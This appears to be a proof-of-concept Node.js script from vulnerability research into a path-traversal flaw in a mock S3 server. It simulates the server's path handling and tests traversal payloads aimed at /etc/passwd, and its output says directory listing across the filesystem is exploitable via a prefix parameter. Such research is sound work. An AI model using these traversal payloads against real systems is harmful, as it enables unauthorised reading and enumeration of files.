// Find a working GET (file read) payload
// The challenge: prefix causes GET->LIST conversion
// We need URL path traversal that survives path.normalize on the URL

const path = require("path");
const localDir = "/home/user/poc/vuln-002-real/mock-data/S3/vuln002-testbucket-dev";
const route = "/vuln002-testbucket-dev";

function simGet(urlPath, description) {
  // Simulate what Express + parseUrl does
  let reqUrl = path.normalize(decodeURIComponent(urlPath));
  const temp = reqUrl.split(route);
  let paramsPath = "";
  let method = "GET";

  // No prefix in these requests — so method stays GET
  if (temp[1] !== undefined) {
    paramsPath = path.normalize(path.join(paramsPath, temp[1].split("?")[0]));
  } else {
    paramsPath = path.normalize(path.join(paramsPath, temp[0].split("?")[0]));
  }

  if (paramsPath[0] === "/" || paramsPath[0] === ".") {
    paramsPath = paramsPath.substring(1);
  }

  const finalPath = path.normalize(path.join(localDir, paramsPath));
  const escaped = !finalPath.startsWith(path.resolve(localDir));

  if (escaped) {
    console.log(`[WORKS] ${description}`);
    console.log(`  url: ${urlPath}`);
    console.log(`  normalizedUrl: ${reqUrl}`);
    console.log(`  temp[1]: ${temp[1] !== undefined ? JSON.stringify(temp[1]) : "undefined"}`);
    console.log(`  paramsPath: ${paramsPath}`);
    console.log(`  finalPath: ${finalPath}`);
    console.log("");
  }
}

// The key insight: after path.normalize resolves ../ in the URL,
// the route might no longer be present. temp[0] then contains
// the whole resolved path. If there's no prefix, params.path
// comes only from the URL path.

// But the URL path ../ gets resolved by normalize BEFORE splitting.
// So /bucket/../../etc/passwd -> /etc/passwd -> no route match ->
// temp[0] = "/etc/passwd" -> strip "/" -> "etc/passwd" -> inside bucket.

// What about using the route name itself as part of traversal?
// If we can make temp[1] contain a traversal...

// Test: put traversal AFTER the bucket name that survives normalize
// /bucket/foo -> normalizes to /bucket/foo -> temp[1] = "/foo"
// We need /bucket/../../ X where the ../ don't go ABOVE bucket in normalize

// That's impossible for simple ../ - they always resolve upward.

// NEW APPROACH: What about symlink-style or double-route?
// /bucket/bucket/../../etc -> normalizes to /etc -> route match gone
// Still doesn't work.

// What about a request that keeps the route in the normalized form?
// Only possible if the path AFTER the route has no ../ sequences.

// CONCLUSION: Direct URL path traversal for GET (file read) is blocked
// by path.normalize on the URL. The vulnerability for GET requires
// a different approach.

// BUT - we can test if serve-static (which runs BEFORE handleRequestAll)
// has its own traversal. serve-static uses send() which has range support.

console.log("=== Testing GET paths (most will not escape) ===\n");
simGet("/vuln002-testbucket-dev/../../../../etc/passwd", "direct ../");
simGet("/vuln002-testbucket-dev/..%2f..%2f..%2f..%2fetc%2fpasswd", "encoded ../");

// What about using the else branch (temp[0]) with a carefully crafted URL
// that resolves to a FILE path?
// URL normalized to /etc/passwd -> temp[0] = /etc/passwd -> strip / -> etc/passwd
// -> path.join(localDir, "etc/passwd") -> INSIDE bucket. Doesn't escape.

// What if URL normalizes to something with ../ still in it?
// path.normalize always resolves ../. So this is impossible.

console.log("=== Direct GET file read is NOT possible via URL path ===");
console.log("=== But LIST via prefix IS confirmed exploitable ===");
console.log("");
console.log("The vulnerability allows:");
console.log("  1. Directory listing anywhere on the filesystem (LIST via prefix)");
console.log("  2. File metadata disclosure (sizes, modification times)");
console.log("  3. Full file enumeration of developer workstation");
